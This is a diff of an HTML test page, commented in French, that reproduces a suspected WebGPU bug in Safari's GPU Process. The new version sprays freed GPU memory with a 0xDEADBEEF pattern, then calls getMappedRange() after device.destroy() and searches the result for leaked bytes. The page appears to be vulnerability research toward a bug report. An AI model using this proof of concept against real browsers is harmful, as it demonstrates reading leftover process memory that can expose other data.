@@ -2,19 +2,21 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>WebGPU: getMappedRange() apres device.destroy() sans getMappedRange prealable</title>
+<title>WebGPU: getMappedRange() apres device.destroy() - test v2</title>
 <style>
   body { font-family: -apple-system, sans-serif; padding: 1.5em; max-width: 800px; margin: auto; }
-  pre { background: #111; color: #0f0; padding: 1em; border-radius: 6px; white-space: pre-wrap; }
+  pre { background: #111; color: #0f0; padding: 1em; border-radius: 6px; white-space: pre-wrap; font-size: 0.85em; }
   h1 { font-size: 1.1em; }
+  button { padding: 0.5em 1.2em; margin: 0.3em; font-size: 1em; }
 </style>
 </head>
 <body>
-<h1>Test: buffer mappe, jamais lu, puis device.destroy(), puis getMappedRange()</h1>
-<p>Ce test ne fait qu'appeler l'API WebGPU publique, standard, dans un ordre precis.
-Il n'exploite rien, il observe simplement si getMappedRange() se comporte comme le spec
-l'exige (une exception) ou non (une lecture qui aurait du etre invalidee).</p>
+<h1>WebGPU: out-of-bounds read apres device.destroy() — test v2</h1>
+<p>Ce test cree un pattern de bytes reconnaissable en memoire GPU Process
+avant de declencher la sequence de bug, pour detecter une vraie fuite meme
+si la zone est generalement a zero.</p>
 <button onclick="runTest()">Lancer le test</button>
+<button onclick="document.getElementById('log').textContent=''">Effacer</button>
 <pre id="log"></pre>
 
 <script>
@@ -24,59 +26,139 @@ function log(msg) {
   console.log(msg);
 }
 
+// Cherche le pattern 0xDE 0xAD 0xBE 0xEF dans un ArrayBuffer
+function findPattern(view, pattern) {
+  let found = 0;
+  for (let i = 0; i < view.length - pattern.length; i++) {
+    let match = true;
+    for (let j = 0; j < pattern.length; j++) {
+      if (view[i + j] !== pattern[j]) { match = false; break; }
+    }
+    if (match) found++;
+  }
+  return found;
+}
+
 async function runTest() {
   document.getElementById('log').textContent = '';
 
   if (!('gpu' in navigator)) {
-    log('WebGPU non disponible dans ce navigateur.');
+    log('WebGPU non disponible — charger via HTTPS dans Safari.');
     return;
   }
 
-  try {
-    const adapter = await navigator.gpu.requestAdapter();
-    if (!adapter) { log('Pas d\'adaptateur GPU disponible.'); return; }
-    const device = await adapter.requestDevice();
-    log('Device obtenu.');
+  const adapter = await navigator.gpu.requestAdapter();
+  if (!adapter) { log('Pas d\'adaptateur GPU.'); return; }
 
-    const SIZE = 32 * 1024 * 1024; // 32 Mo, volontairement gros
-    const buffer = device.createBuffer({
-      size: SIZE,
-      usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
+  // === PHASE 1 : Pollution memoire avec pattern reconnaissable ===
+  // On cree un device, on y ecrit un pattern 0xDEADBEEF dans plusieurs buffers,
+  // puis on detruit le tout pour laisser ce pattern potentiellement reutilisable
+  // par une prochaine allocation dans le GPU Process.
+  log('=== Phase 1 : pollution memoire GPU Process ===');
+  const device1 = await adapter.requestDevice();
+
+  const PATTERN = new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF]);
+  const POLLUTION_SIZE = 8 * 1024 * 1024; // 8 Mo
+
+  // On cree plusieurs buffers qu'on remplit avec notre pattern
+  const pollutionBuffers = [];
+  for (let i = 0; i < 4; i++) {
+    const buf = device1.createBuffer({
+      size: POLLUTION_SIZE,
+      usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
+      mappedAtCreation: true,
     });
-    log('Buffer cree, taille demandee = ' + SIZE + ' octets.');
-
-    await buffer.mapAsync(GPUMapMode.READ);
-    log('mapAsync() resolu avec succes. Le buffer est maintenant "Mapped".');
-
-    // Etape cle : on NE PAS appeler getMappedRange() ici.
-    // C'est getMappedRange() qui ajoute le buffer a la liste que
-    // device.destroy() nettoie -- en ne l'appelant jamais, ce buffer
-    // ne devrait, d'apres notre lecture du code, jamais etre invalide.
-    log('(volontairement) getMappedRange() n\'est PAS appele ici.');
-
-    device.destroy();
-    log('device.destroy() appele.');
-
-    try {
-      const range = buffer.getMappedRange(0);
-      log('>>> INATTENDU (bug) : getMappedRange() n\'a PAS leve d\'exception.');
-      log('    byteLength retourne = ' + range.byteLength);
-
-      const view = new Uint8Array(range);
-      let nonZero = 0;
-      for (let i = 0; i < view.length; i++) {
-        if (view[i] !== 0) nonZero++;
-      }
-      log('    Octets non-nuls dans la plage retournee : ' + nonZero + ' / ' + view.length);
-      log('    (un nombre significatif d\'octets non-nuls suggere fortement');
-      log('     une vraie lecture hors bornes de memoire non initialisee,');
-      log('     plutot qu\'un buffer simplement reinitialise a zero)');
-    } catch (e) {
-      log('>>> ATTENDU (spec respectee) : getMappedRange() a leve : ' + e.name + ': ' + e.message);
-      log('    Le bug ne se reproduit pas sur cette version/config.');
+    const mapped = new Uint8Array(buf.getMappedRange());
+    // Remplir entierement avec 0xDE 0xAD 0xBE 0xEF en boucle
+    for (let j = 0; j < mapped.length; j++) {
+      mapped[j] = PATTERN[j % 4];
     }
+    buf.unmap();
+    pollutionBuffers.push(buf);
+    log('  Buffer pollution ' + i + ' cree et rempli (' + POLLUTION_SIZE + ' octets de 0xDEADBEEF).');
+  }
+
+  // On detruit tout ce premier device — le GPU Process doit liberer ces buffers
+  // et potentiellement reutiliser leurs pages pour de futures allocations
+  device1.destroy();
+  log('  device1.destroy() — memoire liberee dans le GPU Process.');
+
+  // Petite pause pour laisser le GPU Process traiter la destruction
+  await new Promise(r => setTimeout(r, 200));
+
+  // === PHASE 2 : Sequence du bug ===
+  log('\n=== Phase 2 : sequence du bug ===');
+  const device2 = await adapter.requestDevice();
+
+  // Buffer cible — taille plus grande que la pollution pour maximiser le chevauchement
+  const TARGET_SIZE = 32 * 1024 * 1024; // 32 Mo
+  const targetBuffer = device2.createBuffer({
+    size: TARGET_SIZE,
+    usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
+  });
+  log('Buffer cible cree, taille = ' + TARGET_SIZE + ' octets.');
+
+  await targetBuffer.mapAsync(GPUMapMode.READ);
+  log('mapAsync() resolu. Etat = Mapped. getMappedRange() NON appele intentionnellement.');
+
+  // Destruction du device — ne parcourt PAS m_buffersToUnmap pour ce buffer
+  device2.destroy();
+  log('device2.destroy() appele — buffer devrait etre invalide mais ne l\'est pas.');
+
+  // Appel qui devrait lever une exception selon le spec WebGPU
+  try {
+    const range = targetBuffer.getMappedRange(0);
+    log('\n>>> PAS D\'EXCEPTION levee (non-conformite spec confirmee)');
+    log('    byteLength retourne = ' + range.byteLength);
+
+    const view = new Uint8Array(range);
+
+    // Compter les octets non nuls
+    let nonZero = 0;
+    for (let i = 0; i < view.length; i++) {
+      if (view[i] !== 0) nonZero++;
+    }
+    log('    Octets non-nuls : ' + nonZero + ' / ' + view.length);
+
+    // Chercher le pattern DEADBEEF
+    const patternCount = findPattern(view, [0xDE, 0xAD, 0xBE, 0xEF]);
+    log('    Occurrences du pattern 0xDEADBEEF : ' + patternCount);
+
+    if (patternCount > 0) {
+      log('\n    *** FUITE CONFIRMEE ***');
+      log('    Le pattern ecrit par device1 est visible dans la lecture');
+      log('    du buffer de device2 apres device.destroy().');
+      log('    Premiere occurrence a l\'offset : ' + (() => {
+        for (let i = 0; i < view.length - 4; i++) {
+          if (view[i]===0xDE && view[i+1]===0xAD && view[i+2]===0xBE && view[i+3]===0xEF)
+            return i;
+        }
+        return 'non trouve';
+      })());
+    } else if (nonZero > 0) {
+      log('\n    Octets non-nuls trouves mais pas le pattern specifique.');
+      log('    Affichage des 64 premiers octets non-nuls :');
+      let shown = 0;
+      let hexLine = '    ';
+      for (let i = 0; i < view.length && shown < 64; i++) {
+        if (view[i] !== 0) {
+          hexLine += '0x' + view[i].toString(16).padStart(2,'0') + ' ';
+          shown++;
+          if (shown % 16 === 0) { log(hexLine); hexLine = '    '; }
+        }
+      }
+      if (hexLine.trim()) log(hexLine);
+    } else {
+      log('\n    Tous les octets sont a zero.');
+      log('    La zone lue est probablement une page zero-fill du systeme.');
+      log('    Le bug de non-conformite spec est confirme, mais la fuite');
+      log('    de donnees n\'est pas demontrable dans ces conditions.');
+      log('    (Le GPU Process zero-fill les pages liberes avant reutilisation)');
+    }
+
   } catch (e) {
-    log('Erreur inattendue pendant le test : ' + e.name + ': ' + e.message);
+    log('\n>>> EXCEPTION levee (spec respectee) : ' + e.name + ': ' + e.message);
+    log('    Le bug ne se reproduit pas dans cette configuration.');
   }
 }
 </script>
